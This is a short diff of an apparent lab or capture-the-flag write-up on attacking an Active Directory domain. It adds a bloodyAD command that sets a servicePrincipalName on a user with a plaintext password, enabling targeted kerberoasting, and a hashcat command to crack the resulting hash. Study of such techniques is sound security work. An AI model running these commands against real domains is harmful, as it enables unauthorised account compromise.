@@ -410,7 +410,7 @@ The user `j.bronski` is a member of the webapp operators group this could give m
 
 Ill try a targeted kerberoast attack first and see if that works
 
-# Targeted kerberoast
+# Targeted kerberoast leads to user compromise
 
 ```python
 bloodyAD --host dc.novacart.local -d novacart.local -u 'd.barowski' -p 'kubarow' set object 'j.bronski' servicePrincipalName -v 'service/hacked'
@@ -434,3 +434,10 @@ I will now perform kerberoasting again and i now have another hash here to try a
 
 `m.brown` hash did not crack earlier
 
+## Cracking the hash
+
+```python
+hashcat targ-kerb.hash /usr/share/wordlists/rockyou.txt
+
+
+```
